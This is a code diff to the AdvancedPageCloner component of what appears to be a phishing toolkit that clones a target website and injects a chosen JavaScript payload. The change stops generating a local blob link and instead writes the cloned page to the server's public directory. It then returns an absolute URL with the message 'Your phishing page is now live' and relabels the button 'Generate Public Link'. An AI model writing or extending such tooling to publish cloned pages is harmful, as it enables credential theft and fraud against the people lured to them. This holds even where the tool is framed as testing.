@@ -20,6 +20,7 @@ import { Label } from '@/components/ui/label';
 import { QrCodeGenerator } from './qr-code-generator';
 import type { JsPayload } from './javascript-library';
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from './ui/accordion';
+import { hostTestPage } from '@/actions/host-test-page-action';
 
 const formSchema = z.object({
   targetUrl: z.string().url({ message: 'Please enter a valid URL.' }),
@@ -167,23 +168,29 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
     }
   };
 
-  const handleGenerateLink = () => {
+  const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
     setHostedUrl(null);
 
     try {
-        const blob = new Blob([modifiedHtml], { type: 'text/html' });
-        const finalUrl = URL.createObjectURL(blob);
-        setHostedUrl(finalUrl);
+        toast({ title: "Hosting Page...", description: "Writing file to public directory on the server." });
+        const { url: relativeUrl } = await hostTestPage(modifiedHtml);
 
-        toast({ title: "Local Link Generated!", description: "Your attack page is ready." });
+        if (relativeUrl) {
+            // Construct the full absolute URL
+            const absoluteUrl = `${window.location.origin}${relativeUrl}`;
+            setHostedUrl(absoluteUrl);
+            toast({ title: "Public Link Generated!", description: "Your phishing page is now live." });
 
-        logActivity({
-            user: user?.displayName || 'Operator',
-            action: 'Created Advanced Cloned Page',
-            details: `Target: ${form.getValues('targetUrl')}`,
-        });
+            logActivity({
+                user: user?.displayName || 'Operator',
+                action: 'Created Advanced Cloned Page',
+                details: `Target: ${form.getValues('targetUrl')}`,
+            });
+        } else {
+            throw new Error("Hosting action did not return a URL.");
+        }
     } catch(err) {
         const error = err instanceof Error ? err.message : "An unknown error occurred";
         toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
@@ -254,7 +261,7 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
                     </Button>
                     <Button type="button" onClick={handleGenerateLink} disabled={!modifiedHtml || isHosting} className="w-full sm:w-auto">
                         {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
-                        Generate Local Link
+                        Generate Public Link
                     </Button>
                 </div>
             </form>
@@ -271,7 +278,7 @@ export function AdvancedPageCloner({ selectedPayload }: AdvancedPageClonerProps)
                             <Clipboard className="h-4 w-4" />
                         </Button>
                         <Button type="button" size="icon" variant="outline" asChild>
-                            <a href={hostedUrl} target="_blank" rel="noopener noreferrer"><Globe className="h-4 w-4" /></a>
+                            <Link href={hostedUrl} target="_blank" rel="noopener noreferrer"><Globe className="h-4 w-4" /></Link>
                         </Button>
                     </div>
                     <div className="flex justify-center pt-4">
